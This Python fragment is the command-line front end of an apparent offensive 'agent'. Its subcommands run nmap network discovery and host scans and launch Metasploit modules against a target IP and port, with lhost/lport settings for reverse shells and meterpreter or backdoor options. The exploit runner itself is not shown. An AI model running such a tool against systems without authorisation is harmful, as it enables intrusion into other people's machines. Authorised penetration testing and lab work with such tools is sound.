    # network-discovery
    nd_parser = subparsers.add_parser('network-discovery', help='Discover network hosts')
    nd_parser.add_argument('--range', type=str, help='CIDR range (auto-detected if omitted)')
    nd_parser.add_argument('--timing', type=str, default='T4',
                          choices=['T1', 'T2', 'T3', 'T4', 'T5'],
                          help='Nmap timing template (default: T4)')

    # scan-host
    sh_parser = subparsers.add_parser('scan-host', help='Detailed scan of a single host')
    sh_parser.add_argument('target_ip', type=str, help='Target IP address')
    sh_parser.add_argument('--timing', type=str, default='T4',
                          choices=['T1', 'T2', 'T3', 'T4', 'T5'],
                          help='Nmap timing template (default: T4)')

    # exploit
    ex_parser = subparsers.add_parser('exploit', help='Execute an exploit module')
    ex_parser.add_argument('exploit_module', type=str, help='Metasploit module path')
    ex_parser.add_argument('target_ip', type=str, help='Target IP')
    ex_parser.add_argument('target_port', type=int, help='Target port')
    ex_parser.add_argument('lhost', type=str, help='Local host for reverse shell')
    ex_parser.add_argument('lport', type=int, help='Local port for reverse shell')
    ex_parser.add_argument('--payload', type=str, help='Payload to use')
    ex_parser.add_argument('--os-type', type=str, default='linux', choices=['linux', 'windows'])
    ex_parser.add_argument('--exploit-type', type=str, default='command_shell',
                          choices=['meterpreter', 'command_shell', 'backdoor'])

    # status
    subparsers.add_parser('status', help='Show agent status')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(1)

    try:
        if args.command == 'network-discovery':
            discovery = NetworkDiscovery(timing=args.timing)
            result = discovery.run_full_discovery(network_range=args.range)
            output_json(result)

        elif args.command == 'scan-host':
            result = run_host_scan(args.target_ip, timing=args.timing)
            output_json(result)

        elif args.command == 'exploit':
            # For exploit, we don't need network discovery - just use provided lhost
            runner = ExploitRunner(args.lhost)
            result = runner.run_exploit(
                exploit_module=args.exploit_module,
                target_ip=args.target_ip,
                target_port=args.target_port,
                lhost=args.lhost,
                lport=args.lport,
                payload=args.payload,
                os_type=args.os_type,
                exploit_type=args.exploit_type
            )
            output_json(result)

        elif args.command == 'status':
            result = get_agent_status()
            output_json(result)

    except Exception as e:
        output_error(f"Command '{args.command}' failed", str(e))
        sys.exit(1)


if __name__ == "__main__":
    main()
